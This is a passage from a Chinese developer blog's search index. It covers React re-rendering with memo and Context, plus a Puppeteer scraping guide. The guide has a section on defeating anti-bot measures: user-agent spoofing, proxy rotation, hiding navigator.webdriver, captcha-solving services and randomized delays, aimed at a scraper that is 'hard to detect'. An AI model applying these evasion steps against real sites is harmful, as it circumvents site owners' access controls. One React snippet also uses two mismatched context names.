</font><code>&lt;SomeDecoration /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件为例，它只需要渲染一个</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;div /&gt;</code><font style="color:rgb(55, 71, 91);">。</font></p><p><font style="color:rgb(55, 71, 91);">还记得「渲染」是什么意思吗？不记得了的话赶紧回去看看。</font></p><p><font style="color:rgb(55, 71, 91);">如果一个组件接受很多复杂的 prop，有可能渲染这个组件并对比 Virtual DOM 的性能开销甚至小于等于浅比较所有 prop 的开销。绝大部分时候，React 是足够快的。因此，只有当一个</font><font style="color:rgb(55, 71, 91);"> </font><strong>纯组件</strong><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">有大量纯的子组件、或者这个</font><font style="color:rgb(55, 71, 91);"> </font><strong>纯组件</strong><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">内部有很多复杂计算时，我们才需要将其包裹在</font><font style="color:rgb(55, 71, 91);"> </font><code>memo</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">中。</font></p><p><font style="color:rgb(55, 71, 91);">当一个包裹在</font><font style="color:rgb(55, 71, 91);"> </font><code>memo</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">中的组件使用了</font><font style="color:rgb(55, 71, 91);"> </font><code>useState</code><font style="color:rgb(55, 71, 91);">、</font><code>useReducer</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">或者</font><font style="color:rgb(55, 71, 91);"> </font><code>useContext</code><font style="color:rgb(55, 71, 91);">，当这个组件内的状态发生改变时，这个组件仍然会更新。</font></p><p><font style="color:rgb(55, 71, 91);">另外一个 React 默认不 memo 所有组件的原因是：让 React 在 Runtime 中判断子组件的全部依赖、以跳过子组件的不必要更新，是非常困难、非常不现实的。计算子组件依赖的最好时机是编译期间。关于这个 idea 的更多细节，可以看看黄玄在 React Conf 2021 上的演讲</font><font style="color:rgb(55, 71, 91);"> </font><a href="https://www.youtube.com/watch?v=lGEMwh32soc"><font style="color:rgb(55, 71, 91);">React without memo</font></a><font style="color:rgb(55, 71, 91);">。</font></p><h2 id="Rang-Wo-Men-Tan-Tan-Context">让我们谈谈 Context</h2>**误区 3**<font style="color:rgb(55, 71, 91);">：React 组件更新的其中一个原因是 Context.Provider 的 value 发生了更新。</font><p><font style="color:rgb(55, 71, 91);">如果说，当一个组件由于状态改变而更新时，其所有子组件都要随之更新。那么当我们通过 Context 传递的状态发生改变时，订阅了这个 Context 的所有子组件都要更新也是毫不意外的了。</font></p><p><font style="color:rgb(55, 71, 91);">对于纯组件来说，Context 可以视为一个「隐藏的」、或者「内部的」prop：</font></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">User</span> = <span class="title function_">memo</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> user = <span class="title function_">useContext</span>(<span class="title class_">UserContext</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!user) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, new comer!&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">`Hello, <span class="subst">$&#123;user.name&#125;</span>!`</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><font style="color:rgb(55, 71, 91);">在上面的例子中，</font><code>&lt;User /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件是一个不接受任何 prop、不使用</font><font style="color:rgb(55, 71, 91);"> </font><code>useState</code><font style="color:rgb(55, 71, 91);">、也没有任何副作用的纯组件。但是，</font><code>&lt;User /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件依赖</font><font style="color:rgb(55, 71, 91);"> </font><code>UserContext</code><font style="color:rgb(55, 71, 91);">。当</font><font style="color:rgb(55, 71, 91);"> </font><code>UserContext</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">保存的状态发生改变时，</font><code>&lt;User /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件也会更新。</font></p><p><font style="color:rgb(55, 71, 91);">众所周知，当 Context 的 value 发生改变的时候，所有</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;Context.Provider /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">的子组件都会更新。那么为什么即使不依赖 Context 的子组件也会更新呢？Context 本身并不是一个状态管理工具，只是一种状态传递工具。Context 的 value 发生改变的根本原因还是状态的改变：</font></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">CountContext</span> = <span class="title function_">createContext</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">BigNumber</span> = <span class="title function_">memo</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> number = <span class="title function_">useContext</span>(<span class="title class_">CounterContext</span>);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">fontWeight:</span> <span class="attr">700</span>, <span class="attr">fontSize:</span> <span class="attr">36</span> &#125;&#125;&gt;</span>&#123;number&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">Counter</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">const</span> handleButtonClick = <span class="title function_">useCallback</span>(<span class="function">() =&gt;</span> <span class="title function_">setCount</span>(<span class="function"><span class="params">count</span> =&gt;</span> count + <span class="number">1</span>), []);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">CountContext.Provider</span> <span class="attr">value</span>=<span class="string">&#123;count&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">BigNumber</span> <span class="attr">number</span>=<span class="string">&#123;count&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">CountContext.Provider</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">SomeDecoration</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;handleButtonClick&#125;</span>&gt;</span>Increment<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><font style="color:rgb(55, 71, 91);">正如上面的例子，CountContext 发生改变的原因，是</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;Counter /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">组件的</font><font style="color:rgb(55, 71, 91);"> </font><code>count</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">状态发生了改变；发生更新的，也不仅仅是</font><font style="color:rgb(55, 71, 91);"> </font><code>CountContext</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">的消费组件（及其子组件），还包括</font><font style="color:rgb(55, 71, 91);"> </font><code>&lt;Counter /&gt;</code><font style="color:rgb(55, 71, 91);"> </font><font style="color:rgb(55, 71, 91);">所有的子组件。</font></p><h2 id="Can-Kao-Zi-Liao-6">参考资料</h2>+ [<font style="color:rgb(55, 71, 91);">Render and Commit - React Beta Docs</font>](https://beta.reactjs.org/learn/render-and-commit)+ [<font style="color:rgb(55, 71, 91);">React Hooks - Understanding Component Re-renders</font>](https://medium.com/@guptagaruda/react-hooks-understanding-component-re-renders-9708ddee9928)+ [<font style="color:rgb(55, 71, 91);">Why React Re-Renders</font>](https://www.joshwcomeau.com/react/why-react-re-renders/)<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>puppeteer知识汇总</title>
      <link href="/2024/08/29/frontend/scrape/puppeteer-zhi-shi-hui-zong/"/>
      <url>/2024/08/29/frontend/scrape/puppeteer-zhi-shi-hui-zong/</url>
      
        <content type="html"><![CDATA[<p><a name="h9Dld"></a></p><h1 id=""><a href="#" class="headerlink" title=""></a><br /></h1><p><a name="uKQNk"></a></p><h2 id="1-Puppeteer-特点"><a href="#1-Puppeteer-特点" class="headerlink" title="1. Puppeteer 特点"></a>1. Puppeteer 特点</h2><p>Puppeteer 是一个强大的 Web 爬虫工具,具有以下主要特点:</p><ul><li><strong>控制浏览器</strong>: 可以启动和控制 Headless（无头）或有头的 Chrome&#x2F;Chromium 浏览器实例。</li><li><strong>执行 JavaScript</strong>: 能够处理和渲染需要执行 JavaScript 的动态页面。</li><li><strong>模拟用户操作</strong>: 可以模拟用户在浏览器中的各种操作,如点击、输入、导航等。</li><li><strong>适用于动态内容</strong>: 特别适合那些需要执行 JavaScript 才能获取内容的页面。<br><a name="mnmPl"></a></li></ul><h2 id="2-性能优化"><a href="#2-性能优化" class="headerlink" title="2. 性能优化"></a>2. 性能优化</h2><p>提升 Puppeteer 爬取性能的主要方案包括:<br><a name="jOzSm"></a></p><h3 id="2-1-禁用不必要的资源加载"><a href="#2-1-禁用不必要的资源加载" class="headerlink" title="2.1 禁用不必要的资源加载"></a>2.1 禁用不必要的资源加载</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.<span class="title function_">setRequestInterception</span>(<span class="literal">true</span>);</span><br><span class="line">page.<span class="title function_">on</span>(<span class="string">&#x27;request&#x27;</span>, <span class="function">(<span class="params">req</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> ([<span class="string">&#x27;image&#x27;</span>, <span class="string">&#x27;stylesheet&#x27;</span>, <span class="string">&#x27;font&#x27;</span>].<span class="title function_">includes</span>(req.<span class="title function_">resourceType</span>())) &#123;</span><br><span class="line">    req.<span class="title function_">abort</span>();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    req.<span class="title function_">continue</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="nlF9J"></a></p><h3 id="2-2-使用无头模式（Headless）"><a href="#2-2-使用无头模式（Headless）" class="headerlink" title="2.2 使用无头模式（Headless）"></a>2.2 使用无头模式（Headless）</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123; <span class="attr">headless</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure><p><a name="X8R3E"></a></p><h3 id="2-3-并行化操作"><a href="#2-3-并行化操作" class="headerlink" title="2.3 并行化操作"></a>2.3 并行化操作</h3><p>使用<code>puppeteer-cluster</code>库来实现并行处理:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">Cluster</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;puppeteer-cluster&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cluster = <span class="keyword">await</span> <span class="title class_">Cluster</span>.<span class="title function_">launch</span>(&#123;</span><br><span class="line">  <span class="attr">concurrency</span>: <span class="title class_">Cluster</span>.<span class="property">CONCURRENCY_CONTEXT</span>,</span><br><span class="line">  <span class="attr">maxConcurrency</span>: <span class="number">5</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> cluster.<span class="title function_">task</span>(<span class="keyword">async</span> (&#123; page, <span class="attr">data</span>: url &#125;) =&gt; &#123;</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">goto</span>(url);</span><br><span class="line">  <span class="comment">// 执行爬取逻辑</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加URL到集群中</span></span><br><span class="line">cluster.<span class="title function_">queue</span>(<span class="string">&#x27;http://example.com&#x27;</span>);</span><br></pre></td></tr></table></figure><p><a name="yehZH"></a></p><h3 id="2-4-使用持久化浏览器实例"><a href="#2-4-使用持久化浏览器实例" class="headerlink" title="2.4 使用持久化浏览器实例"></a>2.4 使用持久化浏览器实例</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123; <span class="attr">userDataDir</span>: <span class="string">&#x27;./user_data&#x27;</span> &#125;);</span><br></pre></td></tr></table></figure><p><a name="yqCxC"></a></p><h3 id="2-5-设置合理的超时和重试机制"><a href="#2-5-设置合理的超时和重试机制" class="headerlink" title="2.5 设置合理的超时和重试机制"></a>2.5 设置合理的超时和重试机制</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line"><span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123; <span class="attr">timeout</span>: <span class="number">30000</span>, <span class="attr">waitUntil</span>: <span class="string">&#x27;networkidle0&#x27;</span> &#125;);</span><br></pre></td></tr></table></figure><p><a name="AQMld"></a></p><h3 id="2-6-优化页面加载和等待策略"><a href="#2-6-优化页面加载和等待策略" class="headerlink" title="2.6 优化页面加载和等待策略"></a>2.6 优化页面加载和等待策略</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123; <span class="attr">waitUntil</span>: <span class="string">&#x27;domcontentloaded&#x27;</span> &#125;);</span><br></pre></td></tr></table></figure><p><a name="R77F8"></a></p><h3 id="2-7-调整浏览器配置"><a href="#2-7-调整浏览器配置" class="headerlink" title="2.7 调整浏览器配置"></a>2.7 调整浏览器配置</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">  <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>, <span class="string">&#x27;--disable-setuid-sandbox&#x27;</span>, <span class="string">&#x27;--disable-dev-shm-usage&#x27;</span>]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="P5Cmz"></a></p><h2 id="3-反爬虫策略及解决方法"><a href="#3-反爬虫策略及解决方法" class="headerlink" title="3. 反爬虫策略及解决方法"></a>3. 反爬虫策略及解决方法</h2><p><a name="pvJKP"></a></p><h3 id="3-1-用户代理检测"><a href="#3-1-用户代理检测" class="headerlink" title="3.1 用户代理检测"></a>3.1 用户代理检测</h3><p>解决方法:伪装用户代理</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.<span class="title function_">setUserAgent</span>(<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&#x27;</span>);</span><br></pre></td></tr></table></figure><p><a name="mpSSi"></a></p><h3 id="3-2-IP-限制"><a href="#3-2-IP-限制" class="headerlink" title="3.2 IP 限制"></a>3.2 IP 限制</h3><p>解决方法:使用代理池</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">  <span class="attr">args</span>: [<span class="string">&#x27;--proxy-server=http://proxy-server-address:port&#x27;</span>]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="IIPCn"></a></p><h3 id="3-3-设备指纹"><a href="#3-3-设备指纹" class="headerlink" title="3.3 设备指纹"></a>3.3 设备指纹</h3><p>解决方法:无头浏览器-伪装设备指纹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.evaluateOnNewDocument(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(navigator, <span class="string">&#x27;webdriver&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="function">() =&gt;</span> <span class="literal">undefined</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="hhtGh"></a></p><h3 id="3-4-验证码"><a href="#3-4-验证码" class="headerlink" title="3.4 验证码"></a>3.4 验证码</h3><p>解决方法:对于图片验证码,可以使用打码平台或机器学习方法。对于滑动验证码,可以使用以下流程:</p><ol><li>加载完成后截图</li><li>识别旋转角度（使用打码平台或机器学习,或从页面属性中获取）</li><li>使用 sharp 控制旋转</li><li>替换原图<br><a name="l75Ww"></a></li></ol><h3 id="3-5-动态内容加载"><a href="#3-5-动态内容加载" class="headerlink" title="3.5 动态内容加载"></a>3.5 动态内容加载</h3><p>解决方法:使用 Puppeteer 等无头浏览器模拟浏览器环境执行 JavaScript<br><a name="W3zQY"></a></p><h3 id="3-6-访问频率控制"><a href="#3-6-访问频率控制" class="headerlink" title="3.6 访问频率控制"></a>3.6 访问频率控制</h3><p>解决方法:降低抓取频率,添加随机延迟</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.<span class="title function_">waitForTimeout</span>(<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">3000</span>) + <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p><a name="XEHhF"></a></p><h3 id="3-7-内容混淆"><a href="#3-7-内容混淆" class="headerlink" title="3.7 内容混淆"></a>3.7 内容混淆</h3><p>解决方法:分析并解密混淆的内容<br><a name="E1s69"></a></p><h3 id="3-8-行为分析"><a href="#3-8-行为分析" class="headerlink" title="3.8 行为分析"></a>3.8 行为分析</h3><p>解决方法:使用 Puppeteer 模拟人类用户行为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.<span class="title function_">hover</span>(<span class="string">&#x27;selector&#x27;</span>);</span><br><span class="line"><span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&#x27;selector&#x27;</span>);</span><br></pre></td></tr></table></figure><p><a name="YjWyU"></a></p><h2 id="4-错误处理和稳定性"><a href="#4-错误处理和稳定性" class="headerlink" title="4. 错误处理和稳定性"></a>4. 错误处理和稳定性</h2><p><a name="xzaEB"></a></p><h3 id="4-1-爬取失败重试"><a href="#4-1-爬取失败重试" class="headerlink" title="4.1 爬取失败重试"></a>4.1 爬取失败重试</h3><p>使用指数退避（Exponential Backoff）策略:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">retry</span> = <span class="keyword">async</span> (<span class="params">fn, retries = <span class="number">3</span>, delay = <span class="number">1000</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> <span class="title function_">fn</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="keyword">if</span> (retries &lt;= <span class="number">0</span>) <span class="keyword">throw</span> err;</span><br><span class="line">    <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, delay));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">retry</span>(fn, retries - <span class="number">1</span>, delay * <span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a name="X0Yc0"></a></p><h3 id="4-2-子进程崩溃"><a href="#4-2-子进程崩溃" class="headerlink" title="4.2 子进程崩溃"></a>4.2 子进程崩溃</h3><ul><li>使用 PM2 监控和自动重启</li><li>使用 Puppeteer Cluster 管理浏览器实例</li><li>实施健壮性措施:<ul><li>释放资源</li><li>分批抓取</li><li>超时处理</li><li>定期重启<br><a name="bK8cy"></a></li></ul></li></ul><h3 id="4-3-内存泄漏预防"><a href="#4-3-内存泄漏预防" class="headerlink" title="4.3 内存泄漏预防"></a>4.3 内存泄漏预防</h3><ul><li>及时关闭浏览器实例和页面</li><li>使用<code>puppeteer-cluster</code>进行资源管理</li><li>避免全局变量和未释放的对象</li><li>定期重启浏览器实例</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.<span class="title function_">close</span>();</span><br><span class="line"><span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br></pre></td></tr></table></figure><p><a name="jPSAZ"></a></p><h3 id="4-4-判断僵尸进程"><a href="#4-4-判断僵尸进程" class="headerlink" title="4.4 判断僵尸进程"></a>4.4 判断僵尸进程</h3><p>可以使用以下命令检查僵尸进程:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep <span class="string">&#x27;Z&#x27;</span></span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pgrep -l -x <span class="string">&quot;.*&quot;</span> | grep -w Z</span><br></pre></td></tr></table></figure><p><a name="Jt0UN"></a></p><h2 id="5-最佳实践"><a href="#5-最佳实践" class="headerlink" title="5. 最佳实践"></a>5. 最佳实践</h2><ol><li>遵守网站的<code>robots.txt</code>规则和使用条款。</li><li>实现合理的请求间隔和并发限制。</li><li>定期更新和维护爬虫代码,以适应目标网站的变化。</li><li>实现全面的错误处理和日志记录。</li><li>考虑使用数据库或队列系统来管理大规模爬取任务。</li><li>定期检查和优化性能,特别是在大规模爬取时。</li></ol><p>通过遵循这些最佳实践和技巧,你可以构建一个高效、稳定且难以被检测的 Puppeteer 爬虫系统。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端知识体系</title>
      <link href="/2024/06/27/mind/qian-duan-zhi-shi-ti-xi/"/>
      <url>/2024/06/27/mind/qian-duan-zhi-shi-ti-xi/</url>
      
        <content type="html"><![CDATA[<!-- <div class="tag-plugin post-swiper-container" width="fill"><div class="swiper-wrapper"><div class="swiper-slide"><a class="swiper-slide-href_tag" href="javascript:;"><p class="ani animated swiper-slide-desc_tag" swiper-animate-effect="fadeInDown">图片形式</p><img no-lazy class="swiper-slide-img" src="https://edrawcloudpubliccn.oss-cn-shenzhen.aliyuncs.com/viewer/self/22656811/share/2024-6-27/1719474743/main.svg"></a></div></div><div class="swiper-pagination"></div><div class="swiper-button-prev blur"></div><div class="swiper-button-next blur"></div></div> --><!-- <iframe frameborder= "no" border= "0" marginwidth= "0" marginheight= "0" width=900 height=900 src= "https://edrawcloudpubliccn.oss-cn-shenzhen.aliyuncs.com/viewer/self/22656811/share/2024-6-27/1719474743/main.svg"></iframe> --><p>思维导图，web 端首次加载有点慢，需要耐心等待一下<br>（ps：遇到浏览器无响应请点击等待按钮）</p><iframe src="https://mm.edrawsoft.cn/app/editor/jaZLyVRfZFVlVKstNWXhVukwDfvmc1CL?share=1&page=8889934692" width="100%" height="800px" frameborder="0"></iframe><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 思维导图 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思维导图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器</title>
      <link href="/2024/06/27/mind/liu-lan-qi/"/>
      <url>/2024/06/27/mind/liu-lan-qi/</url>
      
